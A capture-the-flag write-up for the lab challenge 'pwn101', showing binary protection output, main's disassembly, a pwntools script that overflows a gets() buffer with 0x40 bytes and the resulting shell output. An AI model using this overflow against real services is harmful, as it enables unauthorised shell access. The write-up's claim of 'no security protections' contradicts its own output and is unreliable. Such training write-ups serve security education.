# pwn101

#### Information Given

This should give you a start: 'AAAAAAAAAAA'

Challenge is running on port 9001

## Step 1

Check the applications security and information

```
arch     x86                                                                                                                                                                                                                                                                         
baddr    0x0                                                                                                                                                                                                                                                                         
binsz    10903                                                                                                                                                                                                                                                                       
bintype  elf                                                                                                                                                                                                                                                                         
bits     64                                                                                                                                                                                                                                                                          
canary   false                                                                                                                                                                                                                                                                       
injprot  false                                                                                                                                                                                                                                                                       
class    ELF64                                                                                                                                                                                                                                                                       
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0                                                                                                                                                                                                                                    
crypto   false                                                                                                                                                                                                                                                                       
endian   little                                                                                                                                                                                                                                                                      
havecode true                                                                                                                                                                                                                                                                        
intrp    /lib64/ld-linux-x86-64.so.2                                                                                                                                                                                                                                                 
laddr    0x0                                                                                                                                                                                                                                                                         
lang     c                                                                                                                                                                                                                                                                           
linenum  true                                                                                                                                                                                                                                                                        
lsyms    true                                                                                                                                                                                                                                                                        
machine  AMD x86-64 architecture                                                                                                                                                                                                                                                     
nx       true                                                                                                                                                                                                                                                                        
os       linux                                                                                                                                                                                                                                                                       
pic      true                                                                                                                                                                                                                                                                        
relocs   true                                                                                                                                                                                                                                                                        
relro    full                                                                                                                                                                                                                                                                        
rpath    NONE                                                                                                                                                                                                                                                                        
sanitize false                                                                                                                                                                                                                                                                       
static   false
stripped false
subsys   linux
va       true
```

There are no security protections on this program

## Step 2

Dump all found functions

There is usually always a main function

```
Non-debugging symbols:
0x0000000000000688  _init
0x00000000000006b0  puts@plt
0x00000000000006c0  system@plt
0x00000000000006d0  gets@plt
0x00000000000006e0  setvbuf@plt
0x00000000000006f0  exit@plt
0x0000000000000700  __cxa_finalize@plt
0x0000000000000710  _start
0x0000000000000740  deregister_tm_clones
0x0000000000000780  register_tm_clones
0x00000000000007d0  __do_global_dtors_aux
0x0000000000000810  frame_dummy
0x000000000000081a  setup
0x000000000000087b  banner
0x000000000000088e  main
0x0000000000000920  __libc_csu_init
0x0000000000000990  __libc_csu_fini
0x0000000000000994  _fini
```

Disassemble main

```
0x000000000000088e <+0>:     push   %rbp
0x000000000000088f <+1>:     mov    %rsp,%rbp
0x0000000000000892 <+4>:     sub    $0x40,%rsp
0x0000000000000896 <+8>:     movl   $0x539,-0x4(%rbp)
0x000000000000089d <+15>:    mov    $0x0,%eax
0x00000000000008a2 <+20>:    call   0x81a <setup>
0x00000000000008a7 <+25>:    mov    $0x0,%eax
0x00000000000008ac <+30>:    call   0x87b <banner>
0x00000000000008b1 <+35>:    lea    0x208(%rip),%rdi        # 0xac0
0x00000000000008b8 <+42>:    call   0x6b0 <puts@plt>
0x00000000000008bd <+47>:    lea    0x2dc(%rip),%rdi        # 0xba0
0x00000000000008c4 <+54>:    call   0x6b0 <puts@plt>
0x00000000000008c9 <+59>:    lea    -0x40(%rbp),%rax
0x00000000000008cd <+63>:    mov    %rax,%rdi
0x00000000000008d0 <+66>:    mov    $0x0,%eax
0x00000000000008d5 <+71>:    call   0x6d0 <gets@plt>
0x00000000000008da <+76>:    cmpl   $0x539,-0x4(%rbp)
0x00000000000008e1 <+83>:    jne    0x8f9 <main+107>
0x00000000000008e3 <+85>:    lea    0x2e6(%rip),%rdi        # 0xbd0
0x00000000000008ea <+92>:    call   0x6b0 <puts@plt>
0x00000000000008ef <+97>:    mov    $0x539,%edi
0x00000000000008f4 <+102>:   call   0x6f0 <exit@plt>
0x00000000000008f9 <+107>:   lea    0x318(%rip),%rdi        # 0xc18
0x0000000000000900 <+114>:   call   0x6b0 <puts@plt>
0x0000000000000905 <+119>:   lea    0x333(%rip),%rdi        # 0xc3f
0x000000000000090c <+126>:   call   0x6c0 <system@plt>
0x0000000000000911 <+131>:   nop
0x0000000000000912 <+132>:   leave
0x0000000000000913 <+133>:   ret
```

We can see that there is a -0x40(%rbp) buffer

## Exploit

```python
import pwn

offset = 0x40
payload = b'A' * offset

p = pwn.remote("10.10.40.72", 9001)
p.recv()
p.sendline(payload)
p.interactive()
```

Since the program didn't really contain anything other than the overflow itself, you can send 0x40 bytes and get the flag

```sh
(.venv) ghostkey :: pocs/thm/pwn101 » python exploit.py 
[+] Opening connection to 10.10.40.72 on port 9001: Done
[*] Switching to interactive mode

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ ls
flag.txt
pwn101
pwn101.c
$ cat flag.txt
THM{REDACTED}
$  
```
